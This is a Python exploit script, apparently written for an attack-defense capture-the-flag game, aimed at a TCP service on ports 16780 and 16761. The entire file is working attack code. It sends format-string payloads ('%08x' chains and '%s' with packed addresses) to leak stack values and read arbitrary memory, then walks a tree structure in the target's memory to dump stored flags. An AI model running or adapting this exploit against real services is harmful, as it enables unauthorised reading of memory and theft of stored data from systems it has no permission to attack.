#!/usr/bin/env python3

import sys
import socket
import struct
import string


def exploit(data, target, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, port))

	s.send(data)
	response = s.recv(1024 * 10)

	s.close()

	return response

def hack_tpl_last(target):
	request = b'/ ' + 1022 * b'a' + b'%08x ' * 38 + b'%08x' + b'\x00'

	response = exploit(request, target, 16780)

	last_vals_addr_base = int(response.split(b' ')[-1], 16)

	for i in range(6):
		last_vals_addr = struct.pack("I", last_vals_addr_base + 4 * i)

		request = b'/ ' + 1022 * b'a' + last_vals_addr + b'%08x ' * 58 + b'%s' + b'\x00'

		flag_addr = exploit(request, target, 16780)[526:530]

		request = b'/ ' + 1022 * b'a' + flag_addr + b'%08x ' * 58 + b'%s' + b'\x00'

		response = exploit(request, target, 16780)

		print(response[526:].decode('ascii'))

def hack_tpl_all(target):

	#make clear weather
	for i in range(6):
		key = b'hakkhakkhak' + string.ascii_lowercase[i].encode('ascii')
		value = b'\x00' * 32

		request = b'\x01\x00\x00\x00' + key + value

		exploit(request, target, 16761)


	request = b'/ ' + 1022 * b'a' + b'%08x ' * 5 + b'%08x' + b'\x00'

	response = exploit(request, target, 16780)

	clear_base = int(response.split(b' ')[-1], 16)

	input()

	#                          root addr    clear addr
	root_base = clear_base + (0x0804F540 - 0x0804AA94)

	queue = []

	for i in range(26):
		request = b'/ ' + 1022 * b'a' + struct.pack("I", root_base + i * 4) + b'%08x ' * 58 + b'%s' + b'\x00'

		addr = exploit(request, target, 16780)[526:530]

		if (len(addr) < 4):
			continue

		queue.append((struct.unpack("I", addr)[0], 1, i))

	print(queue)
	input()

	while queue:
		item, queue = queue[0], queue[1:]

		for i in range(26):
			addr = item[0] + i * 4

			if addr & 0xff == 0:
				continue

			request = b'/ ' + 1022 * b'a' + struct.pack("I", addr) + b'%08x ' * 58 + b'%s' + b'\x00'

			value = exploit(request, target, 16780)

			if item[1] == 12:
				print(value[526:].decode('ascii'))
				break

			addr = value[526:530]

			if (len(addr) < 4):
				continue

			val = struct.unpack("I", addr)[0]
			#print("proceed %s + %s" % ('_' * (item[1] - 1) + string.ascii_lowercase[item[2]], string.ascii_lowercase[i]))

			queue.append((val, item[1] + 1, i))

methods = [hack_tpl_last, hack_tpl_all]

method, target = sys.argv[1:]

methods[int(method)](target)